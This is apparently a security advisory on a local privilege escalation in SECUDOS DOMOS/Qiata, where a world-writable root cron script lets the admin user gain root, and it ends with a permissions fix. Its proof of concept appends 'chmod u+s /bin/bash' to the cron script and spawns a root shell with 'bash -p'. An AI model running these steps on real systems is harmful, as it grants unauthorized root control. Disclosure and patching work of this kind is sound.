# Overview[[1]](#references):

> DOMOS is a hardened operating system from Secudos GmbH. This operating system is used as the base for various applications of the company. It offers a web interface to easily perform administrative tasks within the operating system.

> The SECUDOS Qiata software solution enables customers to exchange files securely. The existing infrastructure of a customer is used to implement the Qiata software providing a way so that the customer can handle sensible files in a simple, secure and traceable way.  
> The DOMOS operating system from SECUDOS GmbH is used as the underlying system for the application. If offers a way to easily perform administrative tasks regarding the Qiata software and the system itself.

# Vulnerability Details:

After the initial setup of the DOMOS operating system and the Qiata software the system provides an administrator with a user called "admin", with the necessary permissions to administrate the Qiata software.

As the Qiata software generates thumbnails of the files send between customers and saving them on the DOMOS system the SECUDOS GmbH created a script (`previewRm.sh`) which takes care of the old thumbnails by deleting all thumbnails after a defined time. This script is delivered by default with the Qiata software and is executed on the system as a cronjob with `root` permission:

```cs
[admin@localhost ~]$ ls -al /etc/cron.daily/previewRm.sh
-rwxrwxrwx   1 root root  175 Jul 10 14:37 previewRm.sh
```

This is where it is possible to get `root` privileges as the user `admin`. Everybody on the system has read/write/execute permissions onto the script.  
This enables an attacker to change the content of the script and let it be executed by the `root` user once a day.

# Proof of Concept (PoC):

For this to work the attacker will need to have initial access to the DOMOS operating system, which will be located within the customers infrastructure.  
Keeping that in mind the following commands will provide the user, in this case the `admin` user with `root` privileges: 

```cs
[admin@localhost ~]$ echo "chmod u+s /bin/bash" >> /etc/cron.daily/previewRm.sh
[admin@localhost ~]$ cat /etc/cron.daily/previewRm.sh
#!/bin/bash

#  This code is NOT free software.
#
#  This script deletes all generated preview files that are older than

LOCATION=/var/lib/fta/company/default/preview
OLDERTHAN=7
FILESCOUNT=`find $LOCATION -type f | wc -l`
if [ $FILESCOUNT -gt 0 ]; then
	find $LOCATION -mtime +$OLDERTHAN -type f -delete
	if [ "$?" != "0" ]; then
		logger -i -t previewRm problem deleting preview files.
	else
		logger -i -t previewRm from total $FILESCOUNT preview files, 
		deleted files older than $OLDERTHAN days.
	fi
else
	logger -i -t previewRm no preview files found at all.
fi
chmod u+s /bin/bash

[admin@localhost cron.daily]$ ls -al /bin/bash
-rwsr-xr-x. 1 root root 1150560 Aug  3  2022 /bin/bash
[admin@localhost cron.daily]$ /bin/bash -p
bash-4.4# id
uid=1000(admin) gid=1000(admin) euid=0(root) groups=1000(admin)
bash-4.4# chown admin:admin previewRm.sh
bash-4.4# ls -al /etc/cron.daily/previewRm.sh
-rwxrwxrwx 1 admin admin 618 Aug 10 13:14 /etc/cron.daily/previewRm.sh
```

# Solution:

The permission of the `previewRm.sh` script should be changed, so that only the root user is able to change the content of the script.
